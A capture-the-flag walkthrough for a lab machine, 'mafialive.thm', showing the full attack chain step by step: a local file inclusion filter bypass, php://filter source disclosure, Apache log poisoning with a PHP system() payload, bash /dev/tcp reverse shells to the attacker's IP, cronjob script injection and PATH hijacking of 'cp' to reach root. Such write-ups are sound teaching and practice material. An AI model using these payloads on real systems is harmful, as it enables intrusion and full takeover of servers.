## Target IP: `10.10.150.235`

---

### Environment Setup

```bash
export IP=10.10.150.235
export LIP=10.6.24.56
```

---

### Initial Scans

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
nikto -h http://$IP
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php
```

**Open Ports:**

| Port | Service |
| --- | --- |
| 22 | SSH (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3) |
| 80 | HTTP (Apache/2.4.29) |

---

### Web Enumeration

Homepage branded as “Wavefire.” Filler text. Source code gives nothing.

**Discovered Directories:**

- `/flags` → Just a Rickroll.
- `/images`
- `/layout`
- `/pages`

Noticed a contact link:

```
support@mafialive.thm
```

Added domain to `/etc/hosts`:

```bash
echo "10.10.150.235 mafialive.thm" >> /etc/hosts
```

Visited `http://mafialive.thm` — saw first flag:

```
UNDER DEVELOPMENT
thm{[REDACTED]}
```

---

### Deeper Enumeration

Gobuster revealed:

- `/robots.txt`
- `/test.php`

**`/test.php`:** Displays a generic message and a button. Clicking it: *“control is an illusion”*

Suspicious `view` parameter in the URL:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
```

Tested for LFI:

```bash
?view=../../../../../../../etc/passwd
```

Returned: “Sorry, that’s not allowed”

---

### Confirming LFI (Local File Inclusion)

`robots.txt` worked when passed to `view` param:

```
?view=/var/www/html/development_testing/robots.txt
```

Confirmed LFI — but restricted to a specific directory.

Tried reading `test.php`:

```bash
?view=/var/www/html/development_testing/test.php
```

No output — makes sense, PHP is executed not rendered.

---

### Reading Source Code via PHP Filters

Used `php://filter` trick to base64-encode the PHP file:

```bash
?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

Decoded result showed this:

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}

if (isset($_GET["view"])) {
    if (
        !containsStr($_GET['view'], '../..') &&
         containsStr($_GET['view'], '/var/www/html/development_testing')
    ) {
        include $_GET['view'];
    } else {
        echo 'Sorry, Thats not allowed';
    }
}
```

So two things must happen:

- Blocked if input contains `../..`
- Must include `/var/www/html/development_testing`

---

### Bypassing LFI Filter

Linux accepts `..//` as `../`, so the filter can be dodged:

```bash
?view=/var/www/html/development_testing/..//..//..//..//etc/passwd
```

Success. Read `/etc/passwd`.

---

### LFI to RCE via Log Poisoning

Targeted Apache’s access logs:

```
/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```

Injected PHP payload via BurpSuite in **User-Agent**:

```php
<?php echo 'PWNED'; ?>
```

Then included the log file:

```bash
?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```

Saw “PWNED” — confirmed code execution.

---

### Reverse Shell Payload

Started listener:

```bash
nc -lvnp 4444
```

Used clean payload in User-Agent:

```php
<?php system('/bin/bash -c "bash -i >& /dev/tcp/10.6.24.56/4444 0>&1"'); ?>
```

Triggered log inclusion again:

```bash
?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```

**Shell popped.**

Navigated to `/home/archangel`, grabbed:

```
user.txt
thm{[REDACTED]}
```

Found `/secret`, but no permissions.

---

### Horizontal Privilege Escalation – Cronjob Abuse

No `sudo` access. No SUID binaries.

Searched for files owned by `archangel`:

```bash
find / -user archangel -type f 2>/dev/null | grep -v /proc
```

Found `/home/archangel/helloworld.sh` — observed it being modified every minute. A cronjob.

Injected shell:

```bash
echo "sh -i >& /dev/tcp/10.6.24.56/7777 0>&1" >> helloworld.sh
nc -lvnp 7777
```

Waited — shell received as user `archangel`.

Read `/home/archangel/secret/user2.txt`

```
thm{[REDACTED]}
```

---

### Vertical Privilege Escalation – PATH Variable Hijack

Found an executable backup script in `/home/archangel/secret/`

```bash
ls -la backup
```

Owned by root, world-executable.

`strings backup`, found this:

```
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

Hijacked `cp` by placing a malicious one in PATH:

```bash
cd /tmp
echo '/bin/bash -p' > cp
chmod 777 cp
export PATH=$PWD:$PATH
```

Explanation: `-p` flag preserves privileges, so bash runs as root.

Executed the vulnerable script:

```bash
cd ~/secret
./backup
```

Root shell spawned.

Grabbed final flag:

```
thm{[REDACTED]}
```
